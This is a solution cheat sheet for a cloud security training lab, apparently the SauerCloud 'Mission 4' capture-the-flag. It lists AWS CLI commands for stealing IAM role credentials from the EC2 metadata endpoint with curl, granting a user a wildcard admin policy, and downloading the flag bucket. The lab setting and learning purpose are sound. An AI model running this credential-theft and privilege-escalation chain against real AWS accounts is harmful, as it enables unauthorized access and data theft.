# Mission 4 cheat sheet


This mission lets users manipulate new EC2 instances in order to become more familiar with security groups, and has a small IAM component.


  * Given: AWS key, AWS secret key, ssh key
  * Variables: $id


$ `aws configure --profile juan`

Set up the credentials for use. Region is always us-east-1 and json output is recommended.


$ `aws --profile juan ec2 describe-instances`

List the existing instances, since it is not possible to list existing s3 buckets. Note the public and private ip addresses as $public_ip and $private_ip. Note the keypair used as $keypair. You may also want to take note of the AMI used, as $ami_id, and the subnet as  $subnet_id.

Visit the public address in browser if you like.


$ `aws --profile juan ec2 describe-security-groups`

Two security groups are available: "filtered", and "allow". The "allow" group will not block you, so you may use it. Note its id as $sg_id.

NB: The programmer would like to highlight the fact that the user's IP is still used, despite the loss of realism, in order to ensure the security of their account. :)


$ `aws --profile juan ec2 run-instances --image-id $ami_id --instance-type t2.micro --subnet-id $subnet_id --security-group-id $sg-id --key-name SauerCloud-mission4-keypair-Evilcorp-Evilkeypair-$id --associate-public-ip-address`

Start a new instances using the "allow" security group, and parameters allowing it to connect to the other instance. You may also create a new keypair yourself. Using "t2.micro" as type serves to ensure you remain in free tier. You need to associate a public ip adddress to ensure you can connect using SSH.


$ `ssh -i ssh_key.pem ec2-user@<new instance public ip>`

Connect into the machine. You may also forward the key into it as well if you want.


$ `ssh -i ssh_key.pem ec2-user@$instance_private_ip`

Connect into the filtered machine from an allowed ip.


## Running commands from the instance

$ `aws iam list-users`

Use the instance's credentials to execute commands.


## Alternative: Get the credentials and load them on your own shell

$ `curl 169.254.169.254/latest/meta-data/iam/security-credentials/SauerCloud-mission4-role-ec2-$id` 

This allows you to get the IAM credentials and write them to your local ~/.aws/credentials file under a named profile.

$ `aws configure --profile mission4-ec2`

Write the access key and secret access key. Add then the security token to your credentials file.

 credentials file

 ---

 [mission4-ec2]
aws_access_key = ASIAXXXXXXXXXXXXX

aws_secret_access_key = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

aws_session_token = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX...XXXXXXXXXXXXX==


## Using the IAM role

$ `aws iam list-users`

List the users of the account. Find the UserName of user juan that you used before. It will be referred to as $juan_name.


$ `vim admin_policy.json`

Write an administrator policy (example follows) to a local .json file.

Example:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```


$  `aws iam put-user-policy --user-name $juan_name --policy-name admin --policy-document file://admin.json`

Since the instance may put user policies, update the user policy of user juan with the admin policy.


$ `aws --profile juan s3 ls; aws --profile juan s3 sync s3://sauercloud-mission4-final-s3-$id ./bucket-data`

Download the data in the final bucket.


$ `cat on_buddha.txt`

You win! Decoding the flag is optional.


## Remember

**Delete anything you created before attempting to destroy the mission, especially the new instance! You can, of course, use the console or the CLI for it with your admin profile.**